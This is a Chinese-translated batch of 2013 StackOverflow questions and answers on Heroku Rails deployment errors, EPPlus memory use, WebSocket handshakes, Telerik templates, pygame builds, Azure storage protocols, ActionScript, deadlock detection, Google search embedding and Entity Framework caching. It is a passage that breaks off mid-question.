# StackOverflow 问答 15262000-15262999

# ruby-on-rails - 使用 Heroku for Ruby on Rails 应用程序部署时出错（heroku 日志已粘贴）

> ID：15262004
> 
> 赞同：0
> 
> 时间：2013-03-07T02:30:19.020
> 
> 标签：ruby-on-rails, ruby-on-rails-3, heroku

我正在尝试使用 Heroku 来部署我的第一个应用程序。我仔细按照说明进行操作，但是当我浏览到提供的链接时收到错误消息[http://boiling-bastion-xxxx.herokuapp.com/](http://boiling-bastion-xxxx.herokuapp.com/)。在我的本地服务器上一切正常。下面是heroku日志。是什么导致应用程序错误？

```
C:\Users\Me\Desktop\sample_app>heroku logs
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/config/environment.rb:5:in `<t
op (required)>'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `block in require'

2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:236:in `load_dependency'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/config.ru:3:in `block in <main
>'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:51:in `initialize'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/config.ru:in `new'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:51:in `instance_eval'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:40:in `eval'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/config.ru:in `<main>'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/server.rb:200:in `app'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:40:in `parse_file'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands/server.rb:46:in `app'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands/server.rb:70:in `start'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/server.rb:304:in `wrapped_app'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/server.rb:254:in `start'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands.rb:55:in `block in <top (required)>'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands.rb:50:in `tap'
2013-03-07T02:20:25+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands.rb:50:in `<top (required)>'
2013-03-07T02:20:25+00:00 app[web.1]:   from script/rails:6:in `require'
2013-03-07T02:20:25+00:00 app[web.1]:   from script/rails:6:in `<main>'
2013-03-07T02:20:26+00:00 heroku[web.1]: Process exited with status 1
2013-03-07T02:20:26+00:00 heroku[web.1]: State changed from crashed to starting
2013-03-07T02:20:26+00:00 heroku[web.1]: State changed from starting to crashed
2013-03-07T02:20:28+00:00 heroku[web.1]: Starting process with command `bundle e
xec rails server -p 25011`
2013-03-07T02:20:36+00:00 app[web.1]: DEPRECATION WARNING: You have Rails 2.3-st
yle plugins in vendor/plugins! Support for these plugins will be removed in Rail
s 4.0\. Move them out and bundle them in your Gemfile, or fold them in to your ap
p as lib/myplugin/* and config/initializers/myplugin.rb. See the release notes f
or more on this: http://weblog.rubyonrails.org/2012/1/4/rails-3-2-0-rc2-has-been
-released. (called from <top (required)> at /app/config/environment.rb:5)
2013-03-07T02:20:36+00:00 app[web.1]: DEPRECATION WARNING: You have Rails 2.3-st
yle plugins in vendor/plugins! Support for these plugins will be removed in Rail
s 4.0\. Move them out and bundle them in your Gemfile, or fold them in to your ap
p as lib/myplugin/* and config/initializers/myplugin.rb. See the release notes f
or more on this: http://weblog.rubyonrails.org/2012/1/4/rails-3-2-0-rc2-has-been
-released. (called from <top (required)> at /app/config/environment.rb:5)
2013-03-07T02:20:36+00:00 app[web.1]: DEPRECATION WARNING: You have Rails 2.3-st
yle plugins in vendor/plugins! Support for these plugins will be removed in Rail
s 4.0\. Move them out and bundle them in your Gemfile, or fold them in to your ap
p as lib/myplugin/* and config/initializers/myplugin.rb. See the release notes f
or more on this: http://weblog.rubyonrails.org/2012/1/4/rails-3-2-0-rc2-has-been
-released. (called from <top (required)> at /app/config/environment.rb:5)
2013-03-07T02:20:38+00:00 app[web.1]:         SECURITY WARNING: No secret option
 provided to Rack::Session::Cookie.
2013-03-07T02:20:38+00:00 app[web.1]:         This poses a security threat. It i
s strongly recommended that you
2013-03-07T02:20:38+00:00 app[web.1]:         provide a secret to prevent exploi
ts that may be possible from crafted
2013-03-07T02:20:38+00:00 app[web.1]:         cookies. This will not be supporte
d in future versions of Rack, and
2013-03-07T02:20:38+00:00 app[web.1]:         future versions will even invalida
te your existing user cookies.
2013-03-07T02:20:38+00:00 app[web.1]:
2013-03-07T02:20:38+00:00 app[web.1]:         Called from: /app/vendor/bundle/ru
by/1.9.1/gems/actionpack-3.2.3/lib/action_dispatch/middleware/session/abstract_s
tore.rb:28:in `initialize'.
2013-03-07T02:20:38+00:00 app[web.1]:
2013-03-07T02:20:41+00:00 app[web.1]: => Booting WEBrick
2013-03-07T02:20:41+00:00 app[web.1]: => Rails 3.2.3 application starting in pro
duction on http://0.0.0.0:25011
2013-03-07T02:20:41+00:00 app[web.1]: => Call with -d to detach
2013-03-07T02:20:41+00:00 app[web.1]: => Ctrl-C to shutdown server
2013-03-07T02:20:41+00:00 app[web.1]: Exiting
2013-03-07T02:20:41+00:00 app[web.1]: /app/vendor/bundle/ruby/1.9.1/gems/actives
upport-3.2.3/lib/active_support/dependencies.rb:251:in `require': /app/app/contr
ollers/widgets_controller.rb:9: syntax error, unexpected keyword_end, expecting
$end (SyntaxError)
2013-03-07T02:20:41+00:00 app[web.1]:       ^
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb
:236:in `load_dependency'
2013-03-07T02:20:41+00:00 app[web.1]:    end
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `block in require'

2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:359:in `require_or_load'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:313:in `depend_on'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:225:in `require_dependenc
y'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/engine.rb:439:in `block (2 levels) in eager_load!'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/engine.rb:438:in `each'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/engine.rb:438:in `block in eager_load!'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/engine.rb:436:in `each'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/engine.rb:436:in `eager_load!'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/application/finisher.rb:53:in `block in <module:Finishe
r>'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/initializable.rb:30:in `instance_exec'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/initializable.rb:30:in `run'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/initializable.rb:54:in `each'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/initializable.rb:55:in `block in run_initializers'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/initializable.rb:54:in `run_initializers'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/application.rb:136:in `initialize!'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/railtie/configurable.rb:30:in `method_missing'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/config/environment.rb:5:in `<t
op (required)>'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `block in require'

2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:236:in `load_dependency'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
activesupport-3.2.3/lib/active_support/dependencies.rb:251:in `require'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/config.ru:3:in `block in <main
>'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:51:in `instance_eval'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:51:in `initialize'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/config.ru:in `new'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/config.ru:in `<main>'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:40:in `eval'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/builder.rb:40:in `parse_file'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/server.rb:200:in `app'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands/server.rb:46:in `app'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/server.rb:304:in `wrapped_app'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
rack-1.4.5/lib/rack/server.rb:254:in `start'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands/server.rb:70:in `start'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands.rb:55:in `block in <top (required)>'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands.rb:50:in `tap'
2013-03-07T02:20:41+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/
railties-3.2.3/lib/rails/commands.rb:50:in `<top (required)>'
2013-03-07T02:20:41+00:00 app[web.1]:   from script/rails:6:in `require'
2013-03-07T02:20:41+00:00 app[web.1]:   from script/rails:6:in `<main>'
2013-03-07T02:20:42+00:00 heroku[web.1]: Process exited with status 1
2013-03-07T02:20:42+00:00 heroku[web.1]: State changed from starting to crashed
2013-03-07T02:22:01+00:00 heroku[api]: Starting process with command `bundle exe
c rake db:migrate` by skim@outlook.com
2013-03-07T02:22:04+00:00 heroku[run.1268]: Starting process with command `bundl
e exec rake db:migrate`
2013-03-07T02:22:04+00:00 heroku[run.1268]: Awaiting client
2013-03-07T02:22:04+00:00 heroku[run.1268]: State changed from starting to up
2013-03-07T02:22:19+00:00 heroku[run.1268]: Process exited with status 0
2013-03-07T02:22:19+00:00 heroku[run.1268]: State changed from up to complete
2013-03-07T02:22:22+00:00 heroku[router]: at=error code=H10 desc="App crashed" m
ethod=GET path=/ host=boiling-bastion-2459.herokuapp.com fwd="75.82.42.93" dyno=
 queue= wait= connect= service= status=503 bytes=
2013-03-07T02:22:22+00:00 heroku[router]: at=error code=H10 desc="App crashed" m
ethod=GET path=/favicon.ico host=boiling-bastion-2459.herokuapp.com fwd="75.82.4
2.93" dyno= queue= wait= connect= service= status=503 bytes=
2013-03-07T02:22:22+00:00 heroku[router]: at=error code=H10 desc="App crashed" m
ethod=GET path=/favicon.ico host=boiling-bastion-2459.herokuapp.com fwd="75.82.4
2.93" dyno= queue= wait= connect= service= status=503 bytes=
2013-03-07T02:22:26+00:00 heroku[router]: at=error code=H10 desc="App crashed" m
ethod=GET path=/ host=boiling-bastion-2459.herokuapp.com fwd="75.82.42.93" dyno=
 queue= wait= connect= service= status=503 bytes=
2013-03-07T02:22:27+00:00 heroku[router]: at=error code=H10 desc="App crashed" m
ethod=GET path=/ host=boiling-bastion-2459.herokuapp.com fwd="75.82.42.93" dyno=
 queue= wait= connect= service= status=503 bytes=
2013-03-07T02:22:30+00:00 heroku[router]: at=error code=H10 desc="App crashed" m
ethod=GET path=/ host=boiling-bastion-2459.herokuapp.com fwd="75.82.42.93" dyno=
 queue= wait= connect= service= status=503 bytes=
2013-03-07T02:22:46+00:00 heroku[router]: at=error code=H10 desc="App crashed" m
ethod=GET path=/ host=boiling-bastion-2459.herokuapp.com fwd="75.82.42.93" dyno=
 queue= wait= connect= service= status=503 bytes=

C:\Users\Me\Desktop\sample_app> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:32:09.417

它在你的`/widgets_controller.rb`

它说

```
syntax error, unexpected keyword_end, expecting $end (SyntaxError) 
```

我假设你不小心遗漏了一个`end`

# c# - 使用 EPPPlus 库将数据导出到 Excel 时，内存使用率变高

> ID：15262006
> 
> 赞同：0
> 
> 时间：2013-03-07T02:30:27.010
> 
> 标签：c#, excel-2010, epplus

我正在使用 EPPlus 库将 DataSet 中可用的数据导出到 excel 文件。行数可以在 1000 到 300000 之间，包含 10-15 列。我们正在运行可以生成从少量记录到大量记录的文件的查询。在导出过程中，一个导出文件的内存会增加几百 MB。

问题：这是预期的行为吗？我知道有一些工具可用于分析内存。我想了解哪个是我可以使用的最佳工具？

1.  [http://msdn.microsoft.com/en-us/library/ff650691.aspx](http://msdn.microsoft.com/en-us/library/ff650691.aspx)
2.  [http://www.eqatec.com/Profiler/](http://www.eqatec.com/Profiler/)
3.  [http://memprofiler.com/](http://memprofiler.com/)
4.  [http://www.red-gate.com/products/dotnet-development/ants-performance-profiler/](http://www.red-gate.com/products/dotnet-development/ants-performance-profiler/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:55:58.177

我一直在使用`CLR Profiler`with `Eqatec Profiler`。它们非常适合检查变量的内存使用情况，检查应用程序的性能。我还使用它们来确定瓶颈。最重要的是。他们是免费的！:D

# websocket - Websocket握手无法建立连接

> ID：15262008
> 
> 赞同：0
> 
> 时间：2013-03-07T02:30:51.337
> 
> 标签：websocket

在 wensocket 服务器上获取的请求是：

```
Upgrade: websocket
Connection: Upgrade
Host: 10.1.5.20:5555
Origin: http://localhost:8080
Sec-WebSocket-Protocol: sip
Pragma: no-cache
Cache-Control: no-cache
Sec-WebSocket-Key: T3jkd1s0pRceQbgdTLoaiQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Extensions: x-webkit-deflate-frame 
```

我试图发回握手的响应是：

```
HTTP/1.1 101 WebSocket Protocol Handshake
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Origin: http://localhost:8080
Sec-WebSocket-Location: ws://10.1.5.20:5555/ 
```

但我收到的错误是：

```
**Exception in thread "main" java.io.IOException: Handshake failed
    at websocket4j.AbstractWebSocket.<init>(AbstractWebSocket.java:123)
    at websocket4j.server.WebSocket.<init>(WebSocket.java:73)
    at websocket4j.server.WebServerSocket.accept(WebServerSocket.java:119)
    at websocket4j.examples.EchoServer.main(EchoServer.java:51)
Caused by: java.io.IOException: End of stream
    at websocket4j.AbstractWebSocket.readBytes(AbstractWebSocket.java:230)
    at websocket4j.server.WebSocket.handshake(WebSocket.java:203)
    at websocket4j.AbstractWebSocket$HandshakeRunner.run(AbstractWebSocket.java:79)
    at java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source)
    at java.util.concurrent.FutureTask$Sync.innerRun(Unknown Source)
    at java.util.concurrent.FutureTask.run(Unknown Source)
    at java.lang.Thread.run(Unknown Source)** 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T09:22:38.130

你不应该用钥匙回应吗？尝试在您的响应中添加 Sec-WebSocket-Accept: sha1(Sec-WebSocket-Key + magic string )

# asp.net-mvc-4 - 访问 Telerik 客户端模板中的对象属性

> ID：15262009
> 
> 赞同：0
> 
> 时间：2013-03-07T02:30:53.343
> 
> 标签：asp.net-mvc-4, telerik-mvc

我的列绑定到一个 Employee 对象，如下所示：

```
class Employee
{
    int Id;
    string Name;
} 
```

我的编辑模板将此列显示为一个下拉框，其中包含由 ajax 绑定填充的选项（我需要这样做，因为选项会根据用户的其他列选择而改变）。

```
@(Html.Telerik().ComboBox()
    .Name("Employee")
    .CascadeTo("Order")
    .DataBinding(binding => binding.Ajax().Select("GetEmployees", "Order"))) 
```

但是，该列继续显示 Employee.Id 值。我通过定义一个服务器端显示模板来显示 Employee.Name 来解决这个问题。

现在我正在尝试启用 InCell 编辑，看起来我只能使用客户端显示模板（这是有道理的）。但是如何访问 Name 属性？

我试过这个，它给了我ID......

```
columns.Bound(o => o.Employee).Title("Employee")
    .ClientTemplate("<text><#= Employee #></text>"); 
```

...这个，这给了我一个空字符串...

```
columns.Bound(o => o.Employee).Title("Employee")
    .ClientTemplate("<text><#= Employee.Name #></text>"); 
```

...还有这个，这给了我一个错误

```
columns.Bound(o => o.Employee).Title("Employee")
    .ClientTemplate("<text><#= Name #></text>"); 
```

有什么方法可以让我的员工单元格按我想要的方式显示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T20:49:57.373

您可以使用 <#> 语法访问绑定对象的属性

```
columns.Bound(c => c.Name).ClientTemplate("<input id='<# Name #>' />); 
```

# macos - 麻烦在Mac上安装python，cc1：错误：无法识别的命令行选项“-arch”

> ID：15262010
> 
> 赞同：1
> 
> 时间：2013-03-07T02:30:59.630
> 
> 标签：macos, gcc, python-2.7, terminal, pygame

不幸的是，我没有太多使用终端或搞乱 gcc 的经验，但是在尝试安装 python 时我不断收到此错误。这是完整的消息：

```
building 'pygame.imageext' extension
gcc-4.2 -fno-strict-aliasing -fno-common -dynamic -isysroot /Developer/SDKs/MacOSX10.6.sdk -arch i386 -arch x86_64 -g -O2 -DNDEBUG -g -O3 -Ddarwin -I/System/Library/Frameworks/SDL.framework/Versions/Current/Headers -I/System/Library/Frameworks/SDL_image.framework/Versions/Current/Headers -I/usr/local/include -I/usr/local/include -I/Library/Frameworks/Python.framework/Versions/2.7/include/python2.7 -c src/imageext.c -o build/temp.macosx-10.6-intel-2.7/src/imageext.o
cc1: error: unrecognized command line option "-arch"
cc1: error: unrecognized command line option "-arch"
error: command 'gcc-4.2' failed with exit status 1 
```

我一直在搞乱链接等，所以绝对有可能我搞砸了，我愿意发布您可能需要帮助的任何其他相关信息。

提前致谢！

# azure-blob-storage - Microsoft 数据中心内 Azure blob 存储的 HTTP 或 HTTPS (SSL)

> ID：15262011
> 
> 赞同：2
> 
> 时间：2013-03-07T02:31:04.740
> 
> 标签：azure-blob-storage

对于 Azure 数据中心内的 blob 请求，是否建议使用 HTTP 或 HTTPS（存储连接字符串中的 DefaultEndpointsProtocol）？也就是说，在 Azure 角色实例和 Blob 存储之间。

我可以看到我必须使用 HTTPS 进行诊断（Microsoft.WindowsAzure.Plugins.Diagnostics.ConnectionString；请参阅[此处](http://msdn.microsoft.com/en-us/library/gg465402.aspx)不正确的 DiagnosticsConnectionString 设置标题）。

我认为 HTTP 会更快，尽管我无法确定它是否重要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-12-21T17:38:25.930

没有关于在 Azure 存储中使用 HTTP 或 HTTPS 的官方 Microsoft 指南。

由于没有发生[HTTPS 握手](http://robertheaton.com/2014/03/27/how-does-https-actually-work/)，因此使用 HTTP 会更快。数据中心内的安全性不应成为问题。

借助Azure 上的[HTTP/2 协议](https://http2.akamai.com/)支持，性能差异将缩小。[Azure 团队正在研究](https://feedback.azure.com/forums/217298-storage/suggestions/6510044-support-http-2-and-spdy)它。

另一方面，HTTPS 是安全的，默认情况下安全是一种很好的做法。

# arrays - Actionscript 3 没有编译器错误，但输出很糟糕

> ID：15262012
> 
> 赞同：2
> 
> 时间：2013-03-07T02:31:25.607
> 
> 标签：arrays, actionscript

所以我对actionscript 3相当陌生，为了练习，我制作了一个脚本，当单击数组中的三个方块之一时，它将把它移动到一个随机点。没有任何编译器错误，但输出显示：

```
ReferenceError: Error #1069: Property x not found on String and there is no default value.
    at trying_Scene1_fla::MainTimeline/move_sq() 
```

单击其中一个方块时。继承人的脚本：

```
import flash.events.MouseEvent;
import flash.events.Event;

var squares:Array=[ square_1, square_2, square_3]
var low:Number=1;
var high:Number=100;
var chosen:Number=Math.floor(Math.random()* (1+ high - low))+low;

for(var i=0; i<squares.length; i++){
    squares[i].addEventListener(MouseEvent.CLICK, move_sq);
}

function move_sq(e:MouseEvent):void{
    var square_num = e.target.name;
    if (chosen>50) {
        square_num.x -= Math.random()* 10
        square_num.y -= Math.random()* 10
    }
    else {
    square_num.x += Math.random()* 10
    square_num.y += Math.random()* 10
    }
}
enter code here 
```

我希望这只是一个小错误或我不知道的事情，如果你能帮忙，请做。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T19:27:38.290

您可以通过在鼠标侦听器功能中执行此操作来修复错误：

```
var square_num = e.target; 
```

但你可以这样做，如果你知道类型：

```
var square_num:MovieClip = MovieClip(e.target); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T02:37:55.400

这是因为“square_num”是一个字符串：

```
var square_num = e.target.name; 
```

e.target 的 name 属性是一个字符串，它没有 x 和 y 属性。我想你可能想使用：

```
var square_num:MovieClip = (MovieClip) (e.target.name); 
```

（我猜“square_1”、“square_2”和“square_3”是电影剪辑）

# algorithm - 执行死锁检测算法时遇到问题

> ID：15262018
> 
> 赞同：1
> 
> 时间：2013-03-07T02:32:21.597
> 
> 标签：algorithm, deadlock

除了一个具体的混淆之外，我已经把它全部整理好了：

> 如果分配[i] != 0，则 Finish[i] := false; 否则，Finish[i] := true。

这是否意味着该特定行的*总和*为零或什么？

**算法：**

数据结构：

*   可用：长度为 m 的向量表示每种类型的可用资源数量。
*   分配：一个 nxm 矩阵定义了当前分配给每个进程的每种类型的资源数量。
*   请求：一个 nxm 矩阵表示每个进程的当前请求。如果 Request[i][j] = k，那么进程 P [i正在请求 k 更多资源类型 R] [j]的实例。
*   功：长度为 m 的向量。
*   完成：长度为 n 的向量。

算法：

1.  初始化工作：=可用。
    *   对于 i = 1, 2, ..., n, 如果分配[i] != 0, 那么 Finish[i] := false; 否则，Finish[i] := true。
2.  找到一个索引 i 使得两者：
    *   (a) 完成[i] = 假
    *   (b) 请求[i] <= 工作
    *   如果不存在这样的 i，则转到步骤 4。
3.  工作 := 工作 + 分配[i]
    *   完成[i] := true
    *   转到第 2 步
4.  如果 Finish[i] = false，对于某些 i, 1 <= i...n，则系统处于死锁状态。此外，如果 Finish[i] = false，则进程 P [i]是死锁的。两个向量之间的小于或等于关系 (<=) 定义如下：设 X 和 Y 为长度为 n 的向量。我们说 X <= Y 当且仅当 x[i] <= y[i] 对于所有 i = 1, 2, ..., n。分配和请求矩阵的行被视为向量，在算法中称为分配[i]和请求[i]。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T02:35:37.453

由于 Allocation [i]是一个向量，“Allocation [i] != 0”意味着针对零向量（由全零组成的向量）测试 Allocation [i 。]

换句话说，“分配[i] == 0”当且仅当向量中的每个条目都是 0。

# html - 如何在我指定的 div 宽度和高度中包含谷歌搜索结果？

> ID：15262020
> 
> 赞同：0
> 
> 时间：2013-03-07T02:32:38.330
> 
> 标签：html, css, google-search

```
<input type="text" name="q" placeholder="Search..." />
<input type="image" src="images/searchBtn.png" name="q" />
<div id="searchResult"></div> 
```

css...

```
#searchResult{width: 1000px; height: 200px;} 
```

怎么做？？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T05:36:26.577

这是我尝试过的示例。试试这个。

```
<head>
<title>Search</title>

<style>
    #searchcontrol
    {
        margin-LEFT:500PX;
    }
</style>

<script src="https://www.google.com/jsapi" type="text/javascript"></script>

<script language="Javascript" type="text/javascript">
    //<!
    google.load('search', '1');
    function DoSearch() 
    {
        // Create a search control
        var searchControl = new google.search.SearchControl();
        searchControl.addSearcher(new google.search.WebSearch());

        searchControl.draw(document.getElementById("searchcontrol"));

        // execute an inital search
        searchControl.execute(document.getElementById("secrchBox").value);
    }
    //]]>
</script>
</head>
<body>
    <div id="searchcontrol">
        <input type="text" id="secrchBox"/>
        <input type="button" value="Submit" onclick=" DoSearch()"/>
    </div>
</body>
</html> 
```

**编辑**

```
<head>
<title>Search</title>
<style>
    #searchcontrol
    {
        margin-LEFT:500PX;
    }
</style>

<script src="https://www.google.com/jsapi" type="text/javascript"></script>

<script language="Javascript" type="text/javascript">
    //<!
    google.load("search", "1", { "nocss": true });

    function DoSearch() 
    {
        var ss = document.getElementById("secrchBox").value;
        // Create a search control
        var searchControl = new google.search.SearchControl();

        searchControl.addSearcher(new google.search.WebSearch());

        searchControl.draw(document.getElementById("searchcontrol"));

        // execute an inital search
        searchControl.execute(ss);
    }
    //]]>
</script>
</head>
<body>
    <div id="searchcontrol">
        <input type="text" id="secrchBox"/>
        <input type="button" value="Submit" onclick=" DoSearch()"/>
    </div>
</body>
</html> 
```

现在默认`css`不会加载。您可以根据自己的意愿进行定制。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T02:38:16.903

您将`<iframe>`,`<script>`或 Google 提供的任何内容放入您的`div`!

```
<div id="searchResult">Google code here!</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T02:46:04.107

你可能有三个选择。- 最难的是解析谷歌结果页面。这可以用 php 完成，并且一些正则表达式可以工作。如果您是经验丰富的开发人员，这是最好的。

-二是使用googlesearch API。这很容易实现。[您可以在此处](https://developers.google.com/custom-search/v1/getting_started#JSONP)查看如何操作。它支持 REST 调用，非常易于使用。优点：相对容易实现，有大量的文档和示例。缺点是您每天有 100 个查询的使用配额。还请记住，您需要获取 API-KEY 并注册才能使用它。

-第三个，包括一个 iframe。这非常容易实现，只需要一行代码，但它并不干净，可能你不想在你的页面里面有 google 的页面。

可能还有另一个混合了很多 javascript 和 Iframe，但是，我看不出这样做的意义，因为有很多更好的选择。

如果您有任何问题，请告诉我。

谢谢！，@leo。

# asp.net-mvc - 如何在没有数据库往返的 POST 操作中获取缓存在 GET 操作中的实体？

> ID：15262024
> 
> 赞同：1
> 
> 时间：2013-03-07T02:33:01.827
> 
> 标签：asp.net-mvc, entity-framework

例如，我将如何做到这一点，以便在以下代码中 POST 操作可以获取缓存在 GET 操作中的实体。

Intellisense 告诉我，`DbSet.Find()`它将在访问数据库之前检查上下文以查看实体是否已缓存。在这种情况下`DbSet.Find()`，POST 操作中的内容*确实会*命中数据库，这意味着没有缓存任何内容。那么实体消失的 GET 操作和 POST 操作之间发生了什么变化？

我真的必须再次从数据库中拉回一个实体才能删除它吗？

```
public class UserController : Controller
{
    private testContext db = new testContext();

    // GET: /User/Delete/5
    public ActionResult Delete(int id = 0)
    {
        User user = db.Users.Find(id);
        if (user == null)
        {
            return HttpNotFound();
        }

